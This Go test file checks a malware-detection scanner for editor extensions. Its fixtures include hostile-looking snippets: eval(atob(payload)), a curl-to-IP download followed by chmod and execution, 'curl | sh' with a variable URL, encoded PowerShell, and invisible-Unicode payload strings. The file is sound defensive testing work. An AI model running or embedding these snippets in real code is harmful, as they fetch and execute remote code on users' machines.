package heur

import (
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/shiva2021/purge/internal/ext"
)

// codeCase is one fixture for a code rule. want == 0 means the rule must
// not fire; otherwise the first finding must be on line want with sev.
type codeCase struct {
	name   string
	rel    string // default out/extension.js
	src    string
	nodeMd bool
	rule   string // finding rule name; default the rule under test
	want   int
	sev    Severity
	detail string // substring expected in Detail
}

func codeTestRule(t *testing.T, name string) FileRule {
	t.Helper()
	for _, r := range fileRules {
		if r.Name == name {
			return r
		}
	}
	t.Fatalf("file rule %q not registered", name)
	return FileRule{}
}

func codeRun(t *testing.T, rule string, cases []codeCase) {
	t.Helper()
	r := codeTestRule(t, rule)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rel := tc.rel
			if rel == "" {
				rel = "out/extension.js"
			}
			c := &FileCtx{Ext: &ext.Extension{Publisher: "x"}, Rel: rel, Data: []byte(tc.src), InNodeModules: tc.nodeMd}
			want := tc.rule
			if want == "" {
				want = rule
			}
			var got []Finding
			for _, f := range r.Check(c) {
				if f.Rule == want {
					got = append(got, f)
				}
			}
			if tc.want == 0 {
				if len(got) > 0 {
					t.Fatalf("want no %s finding, got %+v", want, got)
				}
				return
			}
			if len(got) == 0 {
				t.Fatalf("want %s finding, got none", want)
			}
			f := got[0]
			if f.Line != tc.want || f.Severity != tc.sev {
				t.Errorf("line/sev = %d/%v, want %d/%v (%s)", f.Line, f.Severity, tc.want, tc.sev, f.Detail)
			}
			if f.File != rel {
				t.Errorf("File = %q, want %q", f.File, rel)
			}
			if f.Snippet == "" || utf8.RuneCountInString(f.Snippet) > 170 {
				t.Errorf("bad snippet (%d runes): %q", utf8.RuneCountInString(f.Snippet), f.Snippet)
			}
			if !strings.Contains(f.Detail, tc.detail) {
				t.Errorf("Detail %q does not contain %q", f.Detail, tc.detail)
			}
		})
	}
}

// codeRand returns n deterministic pseudo-random bytes from alphabet.
func codeRand(n int, alphabet string) string {
	var b strings.Builder
	x := uint32(2463534242)
	for range n {
		x ^= x << 13
		x ^= x >> 17
		x ^= x << 5
		b.WriteByte(alphabet[int(x>>8)%len(alphabet)])
	}
	return b.String()
}

const (
	codeB64Alpha  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	codeWideAlpha = codeB64Alpha + "!#%&()*,-.:;<=>?@[]^_{|}~"
	codeWebpack   = "/******/ (() => { // webpackBootstrap\n/******/ \t\"use strict\";\n/******/ \tvar __webpack_modules__ = ({});\n/******/ \tfunction __webpack_require__(moduleId) {\n/******/ \t\treturn __webpack_modules__[moduleId](module);\n/******/ \t}\n"
)

func TestCodeEvalDynamic(t *testing.T) {
	codeRun(t, "eval_dynamic", []codeCase{
		{name: "eval atob", src: "const x = 1;\neval(atob(payload));", want: 2, sev: High, detail: "computed"},
		{name: "new Function", src: "var f = new Function(\"return \" + code);", want: 1, sev: High, detail: "new Function"},
		{name: "Function concat", src: "const g = Function('a', 'return ' + body);", want: 1, sev: High, detail: "Function()"},
		{name: "setTimeout string", src: "setTimeout(\"doIt()\", 100);", want: 1, sev: High, detail: "implicit eval"},
		{name: "vm", src: "const vm = require('vm');\nvm.runInThisContext(src);", want: 2, sev: High, detail: "vm.runIn"},
		{name: "exec concat", src: "const cp = require('child_process');\ncp.execSync('curl ' + url);", want: 2, sev: High, detail: "concatenation"},
		{name: "exec template", src: "const cp = require('child_process');\ncp.exec(`sh -c ${cmd}`);", want: 2, sev: High, detail: "template"},
		{name: "exec base64", src: "const cp = require('child_process');\ncp.execSync(Buffer.from(p, 'base64').toString());", want: 2, sev: High, detail: "base64"},
		{name: "exec fromCharCode", src: "const cp = require('child_process');\ncp.exec(String.fromCharCode(108, 115));", want: 2, sev: High, detail: "fromCharCode"},
		{name: "python exec", rel: "bin/run.py", src: "import base64\nexec(base64.b64decode(p))", want: 2, sev: High, detail: "exec()"},
		{name: "eval literal is medium", src: "eval(\"1+1\");", want: 1, sev: Medium, detail: "literal"},
		{name: "webpack header", src: codeWebpack},
		{name: "JSON.parse", src: "const o = JSON.parse(text);"},
		{name: "execFile git status", src: "const cp = require('child_process');\ncp.execFile('git', ['status'], cb);"},
		{name: "exec static template", src: "const cp = require('child_process');\ncp.execSync(`git status`, { cwd: dir + '/x' });"},
		{name: "plus inside string", src: "const cp = require('child_process');\ncp.spawn('a+b', [x + y]);"},
		{name: "arrow setTimeout", src: "setTimeout(() => run(), 10);\nretrieval(x);"},
		{name: "json skipped", rel: "package.json", src: `{"x": "eval(atob(p))"}`},
	})
}

func TestCodeChildProcessShell(t *testing.T) {
	codeRun(t, "child_process_shell", []codeCase{
		{name: "require", src: "'use strict';\nconst cp = require(\"child_process\");", want: 2, sev: Medium, detail: "child_process"},
		{name: "import node:", src: "import { spawn } from 'node:child_process';", want: 1, sev: Medium},
		{name: "shell true", src: "x();\nspawn(cmd, args, { shell: true });", want: 2, sev: Medium, detail: "shell: true"},
		{name: "osascript", src: "exec('osascript -e \"display dialog\"');", want: 1, sev: Medium, detail: "osascript"},
		{name: "python shell", rel: "s/a.py", src: "import subprocess\nsubprocess.run(cmd, shell=True)", want: 2, sev: Medium},
		{name: "fs require", src: "const fs = require('fs');"},
		{name: "spawn no shell", src: "spawn('git', ['status']);"},
		{name: "prose", src: "// spawns a child process later\nconst n = 1;"},
	})
}

func TestCodeHexIdentifiers(t *testing.T) {
	many := strings.Repeat("var _0x1a2b3c = 1;\n", 10)
	oneLine := "x();\nvar _0xab12=_0xcd34(_0xef56,_0x7890,_0xaaaa);"
	codeRun(t, "obf_hex_identifiers", []codeCase{
		{name: "ten in file", src: many, want: 1, sev: Medium, detail: "10 _0x"},
		{name: "five on a line", src: oneLine, want: 2, sev: Medium, detail: "5 _0x"},
		{name: "four on a line", src: "var _0xab12=_0xcd34(_0xef56,_0x7890);"},
		{name: "hex literals", src: "const c = 0x1234; const _0x12 = 0xffff;"},
	})
}

func TestCodeEscapedStrings(t *testing.T) {
	codeRun(t, "obf_escaped_strings", []codeCase{
		{name: "hex run", src: "a();\nconst s = \"\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\";", want: 2, sev: Medium, detail: "run of 8"},
		{name: "unicode run", src: "const s = '\\u0065\\u0076\\u0061\\u006c\\u0028\\u0029\\u003b\\u0020\\u0021';", want: 1, sev: Medium, detail: "run of 9"},
		{name: "twenty scattered", src: strings.Repeat("t('\\u0041 x');\n", 20), want: 1, sev: Medium, detail: "20"},
		{name: "plain escapes", src: "const s = \"line\\n\\ttab\";"},
		{name: "accents", src: "const s = 'caf\\u00e9 cr\\u00e8me \\x41';"},
	})
}

func TestCodeHighEntropyString(t *testing.T) {
	blob := codeRand(300, codeWideAlpha)
	english := strings.Repeat("the quick brown fox jumps over the lazy dog ", 6)
	colors := strings.Repeat("#ff00aa,#00ffcc,#123456,", 12)
	codeRun(t, "obf_high_entropy_string", []codeCase{
		{name: "packed string", src: "a();\nconst k = \"" + blob + "\";", want: 2, sev: High, detail: "entropy"},
		{name: "node_modules", src: "const k = '" + blob + "';", nodeMd: true, want: 1, sev: Medium, detail: "300 chars"},
		{name: "data uri", src: "const img = \"data:image/png;base64," + codeRand(400, codeB64Alpha) + "\";"},
		{name: "english", src: "const s = \"" + english + "\";"},
		{name: "colour table", src: "const c = '" + colors + "';"},
		{name: "short", src: "const k = \"" + blob[:150] + "\";"},
	})
}

func TestCodeBase64Blob(t *testing.T) {
	b := codeRand(500, codeB64Alpha)
	codeRun(t, "obf_base64_blob", []codeCase{
		{name: "plain blob", src: "a();\nconst blob = \"" + b + "\";", want: 2, sev: Low, detail: "500-char"},
		{name: "decoded later", src: "const blob = \"" + b + "\";\nconst p = Buffer.from(blob, 'base64');", want: 1, sev: Medium, detail: "decoded"},
		{name: "eval atob", src: "eval(atob(\"" + b + "\"));", want: 1, sev: Medium},
		{name: "too short", src: "const blob = \"" + b[:399] + "\";"},
		{name: "source map", src: "x();\n//# sourceMappingURL=data:application/json;base64," + b},
	})
}

func TestCodeInvisibleUnicode(t *testing.T) {
	glass := "const s = \"" + strings.Repeat(string(rune(0xE0100+7)), 40) + "\"; eval(decode(s));"
	codeRun(t, "invisible_unicode", []codeCase{
		{name: "glassworm", src: "x();\n" + glass, want: 2, sev: Critical, detail: "40 invisible code points (variation selectors supplement"},
		{name: "zero width in identifier", rule: "invisible_identifier", src: "const a\u200B = 1;", want: 1, sev: High, detail: "zero-width"},
		{name: "lone zero width is not a payload", src: "const a\u200B = 1;", want: 1, sev: Info, detail: "isolated"},
		{name: "scattered in charset table", src: "var t = '\\ufeff\u200b\u2013'; var h = {af:'\u2061'};", want: 1, sev: Info, detail: "isolated"},
		{name: "pua run", src: "const p = '" + strings.Repeat("\uE123", 10) + "';", want: 1, sev: Critical, detail: "private use"},
		{name: "lone BOM", src: string(rune(0xFEFF)) + "const a = 1;"},
		{name: "emoji with VS16", src: "log('\u26A0\uFE0F warning');"},
		{name: "keycap", src: "log('1\uFE0F\u20E3 first');"},
		{name: "invalid utf8", src: "a();\nconst s = '\xff\xfe';", rule: "invalid_utf8", want: 2, sev: Info, detail: "2 invalid"},
	})
}

func TestCodeRemoteExecChain(t *testing.T) {
	codeRun(t, "remote_exec_chain", []codeCase{
		{name: "get chmod", src: "const https = require('https');\nhttps.get(url, r => r.pipe(f));\nfs.chmodSync(p, 0o755);", want: 3, sev: Critical, detail: "executable"},
		{name: "fetch write exec", src: "const cp = require('child_process');\nconst r = await fetch(u);\nfs.writeFileSync(p, buf);\ncp.execFile(p);", want: 4, sev: Critical, detail: "writes a file"},
		{name: "shell curl chmod", rel: "bin/install.sh", src: "curl -s http://1.2.3.4/a -o /tmp/a\nchmod +x /tmp/a\n/tmp/a", want: 2, sev: Critical},
		{name: "powershell enc", src: "fetch(u);\nrun('powershell -NoP -enc SQBFAFgA');", want: 2, sev: Critical, detail: "PowerShell"},
		{name: "fetch only", src: "const r = await fetch(u);\nfs.writeFileSync(p, await r.text());"},
		{name: "write exec no download", src: "const cp = require('child_process');\nfs.writeFileSync(p, s);\ncp.execFile('git', ['status']);"},
		{name: "chmod no download", rel: "a.sh", src: "chmod +x ./bin/tool\n./bin/tool"},
	})
}

func TestCodeDynamicRequireNet(t *testing.T) {
	codeRun(t, "dynamic_require_net", []codeCase{
		{name: "computed", src: "const m = require(name);", want: 1, sev: Low, detail: "computed"},
		{name: "path join", src: "x();\nconst m = require(path.join(dir, f));", want: 2, sev: Low},
		{name: "lazy https", src: "function f() {\n  const h = require('https');\n}", want: 2, sev: Low, detail: "https"},
		{name: "top level too", src: "const https = require('https');\nfunction f() {\n  const h = require('https');\n}"},
		{name: "literal", src: "const u = require('./util');\nconst fs = require(\"fs\");"},
		{name: "webpack require", src: codeWebpack},
	})
}

func TestCodeLongLine(t *testing.T) {
	short := strings.Repeat("const a = 1;\n", 60)
	long := strings.Repeat("x = 1; ", 900) // 6300 chars
	codeRun(t, "obf_long_line", []codeCase{
		{name: "one long", src: short + long + "\n" + short, want: 61, sev: Low, detail: "6300-char"},
		{name: "long first", src: long + "\n" + short + short, want: 1, sev: Low},
		{name: "source map", src: short + "//# sourceMappingURL=data:application/json;base64," + codeRand(6000, codeB64Alpha) + "\n" + short},
		{name: "minified", src: long},
		{name: "under limit", src: short + long[:4900] + "\n" + short},
	})
}

func TestCodeCapAndOrder(t *testing.T) {
	r := codeTestRule(t, "eval_dynamic")
	src := strings.Repeat("eval(x);\n", 8)
	got := r.Check(&FileCtx{Ext: &ext.Extension{Publisher: "x"}, Rel: "a.ts", Data: []byte(src)})
	if len(got) != 5 {
		t.Fatalf("want 5 findings, got %d", len(got))
	}
	for i, f := range got {
		if f.Line != i+1 {
			t.Errorf("finding %d on line %d", i, f.Line)
		}
	}
}

func TestCodeEntropy(t *testing.T) {
	if h := codeEntropy([]byte("aaaa")); h != 0 {
		t.Errorf("entropy(aaaa) = %v", h)
	}
	if h := codeEntropy([]byte("abcd")); h != 2 {
		t.Errorf("entropy(abcd) = %v", h)
	}
}

// Regressions from the first real-machine scan (Microsoft Python/Jupyter
// bundles): unrelated code in one minified file must not form a chain.
func TestCodeRemoteExecChainProximity(t *testing.T) {
	far := "fetch(u);" + strings.Repeat("x", 5000) + "fs.chmodSync(p,493);"
	codeRun(t, "remote_exec_chain", []codeCase{
		{name: "download far from chmod", src: far},
		{name: "shell-name regex is not a pipe", src: "fetch(u); const isShell = /bash|zsh|fish/i.test(p);"},
		{name: "official https installer", src: `fetch(u); args: ["-c", "curl -LsSf https://astral.sh/uv/install.sh | sh"]`, want: 1, sev: Medium, detail: "fixed HTTPS"},
		{name: "variable url into sh", src: "exec(`curl -s ${u} | sh`)", want: 1, sev: Critical, detail: "non-fixed"},
		{name: "download then chmod nearby", src: "https.get(u, r => r.pipe(f)); fs.chmodSync(p, 0o755);", want: 1, sev: Critical, detail: "chmod"},
	})
}
